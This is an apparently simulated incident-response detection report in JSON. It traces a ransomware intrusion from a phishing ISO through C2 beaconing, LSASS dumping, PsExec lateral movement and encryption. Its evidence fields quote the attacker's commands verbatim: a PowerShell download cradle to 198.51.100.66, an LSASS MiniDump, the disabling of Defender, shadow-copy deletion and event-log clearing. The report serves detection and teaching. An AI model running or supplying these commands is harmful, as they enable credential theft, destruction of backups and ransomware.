@@ -1,0 +1,366 @@
+{
+  "integrity": {
+    "WS-0102": [],
+    "FS01": []
+  },
+  "event_count": 305,
+  "findings": [
+    {
+      "rule": "DF-01",
+      "tactic": "Initial Access",
+      "technique": "T1553.005",
+      "severity": "high",
+      "title": "Disk image (ISO/IMG/VHD) written by browser or mail client",
+      "time": "2026-10-27T14:25:00.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "C:\\Users\\tnguyen\\Downloads\\Payroll_Nov2026.iso"
+    },
+    {
+      "rule": "DF-02",
+      "tactic": "Execution",
+      "technique": "T1218.005",
+      "severity": "high",
+      "title": "mshta.exe executing HTA / script",
+      "time": "2026-10-27T14:26:35.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "\"mshta.exe\" \"E:\\Payroll_Nov2026.hta\""
+    },
+    {
+      "rule": "DF-03",
+      "tactic": "Execution",
+      "technique": "T1059.001",
+      "severity": "high",
+      "title": "Encoded / hidden PowerShell",
+      "time": "2026-10-27T14:26:41.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEAJwApAA==",
+      "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a')"
+    },
+    {
+      "rule": "DF-06",
+      "tactic": "Execution",
+      "technique": "T1105",
+      "severity": "medium",
+      "title": "Executable/DLL dropped in user-writable path",
+      "time": "2026-10-27T14:26:50.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "C:\\ProgramData\\SysUpdate\\upd.dll"
+    },
+    {
+      "rule": "DF-05",
+      "tactic": "Defense Evasion",
+      "technique": "T1218.011",
+      "severity": "high",
+      "title": "rundll32 loading a DLL from a user-writable path",
+      "time": "2026-10-27T14:26:55.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "rundll32.exe C:\\ProgramData\\SysUpdate\\upd.dll,Start"
+    },
+    {
+      "rule": "DF-20",
+      "tactic": "Command and Control",
+      "technique": "T1071.001",
+      "severity": "critical",
+      "title": "C2 beaconing every ~60.1s (30 connections, jitter 0.04)",
+      "time": "2026-10-27T14:26:58.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "",
+      "evidence": "C:\\Windows\\System32\\rundll32.exe -> 198.51.100.66:443"
+    },
+    {
+      "rule": "DF-07",
+      "tactic": "Persistence",
+      "technique": "T1053.005",
+      "severity": "high",
+      "title": "Scheduled task created (command line)",
+      "time": "2026-10-27T14:27:20.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "schtasks /create /tn \"MicrosoftEdgeUpdateTaskCore\" /tr \"rundll32.exe C:\\ProgramData\\SysUpdate\\upd.dll,Start\" /sc onlogon /rl highest"
+    },
+    {
+      "rule": "DF-08",
+      "tactic": "Persistence",
+      "technique": "T1053.005",
+      "severity": "high",
+      "title": "Scheduled task registered (Event 4698)",
+      "time": "2026-10-27T14:27:21.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "rundll32.exe C:\\ProgramData\\SysUpdate\\upd.dll,Start"
+    },
+    {
+      "rule": "DF-10",
+      "tactic": "Discovery",
+      "technique": "T1087.002",
+      "severity": "medium",
+      "title": "Domain / privileged-group discovery commands",
+      "time": "2026-10-27T14:35:00.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "cmd.exe /c whoami /all & net group \"domain admins\" /domain & nltest /dclist:corp.example"
+    },
+    {
+      "rule": "DF-11",
+      "tactic": "Credential Access",
+      "technique": "T1003.001",
+      "severity": "critical",
+      "title": "LSASS memory dump (comsvcs MiniDump / procdump)",
+      "time": "2026-10-27T14:50:00.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\ProgramData\\SysUpdate\\d.bin full"
+    },
+    {
+      "rule": "DF-12",
+      "tactic": "Credential Access",
+      "technique": "T1003.001",
+      "severity": "critical",
+      "title": "Process opened LSASS with full access (Sysmon 10)",
+      "time": "2026-10-27T14:50:00.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "C:\\Windows\\System32\\lsass.exe"
+    },
+    {
+      "rule": "DF-13",
+      "tactic": "Defense Evasion",
+      "technique": "T1562.001",
+      "severity": "critical",
+      "title": "Microsoft Defender protection disabled",
+      "time": "2026-10-27T14:51:40.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+    },
+    {
+      "rule": "DF-14",
+      "tactic": "Lateral Movement",
+      "technique": "T1569.002",
+      "severity": "high",
+      "title": "PsExec remote execution",
+      "time": "2026-10-27T15:25:00.000Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\svc_backup",
+      "evidence": "PsExec64.exe \\\\FS01.corp.example -accepteula -s cmd.exe /c C:\\Windows\\Temp\\lk.exe"
+    },
+    {
+      "rule": "DF-15",
+      "tactic": "Lateral Movement",
+      "technique": "T1021.002",
+      "severity": "medium",
+      "title": "Network logon (type 3) from a workstation to a server",
+      "time": "2026-10-27T15:25:02.000Z",
+      "host": "FS01.corp.example",
+      "user": "svc_backup",
+      "evidence": "EventID 4624"
+    },
+    {
+      "rule": "DF-09",
+      "tactic": "Persistence",
+      "technique": "T1543.003",
+      "severity": "medium",
+      "title": "New service installed (Event 7045)",
+      "time": "2026-10-27T15:25:03.000Z",
+      "host": "FS01.corp.example",
+      "user": "CORP\\svc_backup",
+      "evidence": "%SystemRoot%\\PSEXESVC.exe"
+    },
+    {
+      "rule": "DF-14",
+      "tactic": "Lateral Movement",
+      "technique": "T1569.002",
+      "severity": "high",
+      "title": "PsExec remote execution",
+      "time": "2026-10-27T15:25:03.000Z",
+      "host": "FS01.corp.example",
+      "user": "CORP\\svc_backup",
+      "evidence": "%SystemRoot%\\PSEXESVC.exe"
+    },
+    {
+      "rule": "DF-18",
+      "tactic": "Execution",
+      "technique": "T1569.002",
+      "severity": "high",
+      "title": "Process executed from Windows\\Temp by a service (SYSTEM)",
+      "time": "2026-10-27T15:25:04.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "C:\\Windows\\Temp\\lk.exe --path D:\\Shares --ext .lockd"
+    },
+    {
+      "rule": "DF-16",
+      "tactic": "Impact",
+      "technique": "T1490",
+      "severity": "critical",
+      "title": "Shadow copies / backup catalog deleted, recovery disabled",
+      "time": "2026-10-27T15:25:06.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "vssadmin.exe delete shadows /all /quiet"
+    },
+    {
+      "rule": "DF-16",
+      "tactic": "Impact",
+      "technique": "T1490",
+      "severity": "critical",
+      "title": "Shadow copies / backup catalog deleted, recovery disabled",
+      "time": "2026-10-27T15:25:07.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "wbadmin delete catalog -quiet"
+    },
+    {
+      "rule": "DF-16",
+      "tactic": "Impact",
+      "technique": "T1490",
+      "severity": "critical",
+      "title": "Shadow copies / backup catalog deleted, recovery disabled",
+      "time": "2026-10-27T15:25:08.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "bcdedit /set {default} recoveryenabled no"
+    },
+    {
+      "rule": "DF-21",
+      "tactic": "Impact",
+      "technique": "T1486",
+      "severity": "critical",
+      "title": "Mass encryption: 250 files renamed to *.lockd",
+      "time": "2026-10-27T15:25:10.000Z",
+      "host": "FS01.corp.example",
+      "user": "",
+      "evidence": "C:\\Windows\\Temp\\lk.exe (2026-10-27T15:25:10.000Z \u2192 2026-10-27T15:29:19.000Z)"
+    },
+    {
+      "rule": "DF-22",
+      "tactic": "Impact",
+      "technique": "T1486",
+      "severity": "critical",
+      "title": "Ransom note dropped",
+      "time": "2026-10-27T15:30:00.000Z",
+      "host": "FS01.corp.example",
+      "user": "",
+      "evidence": "D:\\Shares\\README_RESTORE_FILES.txt"
+    },
+    {
+      "rule": "DF-17",
+      "tactic": "Defense Evasion",
+      "technique": "T1070.001",
+      "severity": "critical",
+      "title": "Event log cleared",
+      "time": "2026-10-27T15:30:50.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "wevtutil.exe cl Security"
+    },
+    {
+      "rule": "DF-17",
+      "tactic": "Defense Evasion",
+      "technique": "T1070.001",
+      "severity": "critical",
+      "title": "Event log cleared",
+      "time": "2026-10-27T15:30:51.000Z",
+      "host": "FS01.corp.example",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "evidence": "EventID 1102"
+    },
+    {
+      "rule": "DF-23",
+      "tactic": "Persistence",
+      "technique": "T1053.005",
+      "severity": "high",
+      "title": "Live scheduled task runs from user-writable path (\\MicrosoftEdgeUpdateTaskCore)",
+      "time": "2026-10-27T20:10:00Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "rundll32.exe C:\\ProgramData\\SysUpdate\\upd.dll,Start"
+    },
+    {
+      "rule": "DF-24",
+      "tactic": "Command and Control",
+      "technique": "T1071",
+      "severity": "critical",
+      "title": "Active connection to internet from suspicious process at collection time",
+      "time": "2026-10-27T20:10:00Z",
+      "host": "WS-0102.corp.example",
+      "user": "CORP\\tnguyen",
+      "evidence": "rundll32.exe C:\\ProgramData\\SysUpdate\\upd.dll,Start -> 198.51.100.66:443"
+    }
+  ],
+  "kill_chain": {
+    "Initial Access": 1,
+    "Execution": 4,
+    "Persistence": 4,
+    "Privilege Escalation": 0,
+    "Defense Evasion": 4,
+    "Credential Access": 2,
+    "Discovery": 1,
+    "Lateral Movement": 3,
+    "Command and Control": 2,
+    "Impact": 5
+  },
+  "first_malicious": {
+    "rule": "DF-01",
+    "tactic": "Initial Access",
+    "technique": "T1553.005",
+    "severity": "high",
+    "title": "Disk image (ISO/IMG/VHD) written by browser or mail client",
+    "time": "2026-10-27T14:25:00.000Z",
+    "host": "WS-0102.corp.example",
+    "user": "CORP\\tnguyen",
+    "evidence": "C:\\Users\\tnguyen\\Downloads\\Payroll_Nov2026.iso"
+  },
+  "iocs": {
+    "path": [
+      "C:\\ProgramData\\SysUpdate\\d.bin",
+      "C:\\ProgramData\\SysUpdate\\upd.dll",
+      "C:\\Users\\tnguyen\\Downloads\\Payroll_Nov2026.iso",
+      "C:\\Windows\\Temp\\lk.exe"
+    ],
+    "ipv4": [
+      "198.51.100.66"
+    ],
+    "url": [
+      "http://198.51.100.66/a"
+    ],
+    "scheduled_task": [
+      "\\MicrosoftEdgeUpdateTaskCore"
+    ],
+    "sha256": [
+      "065100A9BA3BDBDF9E140BC2EF8569B9545234CC11426EB0274727362E99ABAC  (PsExec64.exe)",
+      "A1FED1CAE33CC3F71ED0C834EB91C54E0D6417760C98DC5ED45841AE65E01D30  (lk.exe)"
+    ],
+    "service": [
+      "PSEXESVC"
+    ]
+  },
+  "severity_counts": {
+    "high": 10,
+    "medium": 4,
+    "critical": 12
+  },
+  "hosts": {
+    "WS-0102": {
+      "hostname": "WS-0102.corp.example",
+      "os": "Windows 11 Pro 23H2",
+      "ip": "10.10.20.102",
+      "collected_utc": "2026-10-27T20:10:00Z",
+      "collected_by": "X. West (IR-2026-1027)",
+      "timezone": "Eastern Standard Time"
+    },
+    "FS01": {
+      "hostname": "FS01.corp.example",
+      "os": "Windows Server 2019",
+      "ip": "10.10.5.20",
+      "collected_utc": "2026-10-27T20:40:00Z",
+      "collected_by": "X. West (IR-2026-1027)",
+      "timezone": "Eastern Standard Time"
+    }
+  }
+}
